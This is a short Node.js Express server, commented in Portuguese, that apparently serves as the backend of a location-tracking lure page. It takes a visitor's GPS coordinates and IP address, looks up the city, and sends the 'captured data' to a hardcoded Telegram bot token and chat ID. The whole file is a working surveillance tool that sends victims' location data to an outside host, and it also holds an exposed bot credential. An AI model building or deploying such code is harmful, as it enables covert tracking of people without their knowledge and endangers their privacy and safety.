const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = "8592193749:AAHCEHrIpY8Yz6EaEyMg2-ClFNbA5iCXvcs";
const TELEGRAM_CHAT_ID = "8544555619";

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;
  const userIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  let ipCity = "N/A";
  try {
    const ipResponse = await axios.get(`http://ip-api.com/json/${userIp}`);
    ipCity = ipResponse.data.city || "N/A";
  } catch (err) {
    console.error("Erro ao buscar IP API");
  }

  const message = `Dados Capturados:\n` +
                  `IP: ${userIp}\n` +
                  `Cidade (IP): ${ipCity}\n` +
                  `GPS Latitude: ${latitude || "Negado"}\n` +
                  `GPS Longitude: ${longitude || "Negado"}\n` +
                  `Maps: ${maps || "N/A"}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false });
  }
});

app.listen(8088, () => {
  console.log("Servidor rodando na porta 8088");
});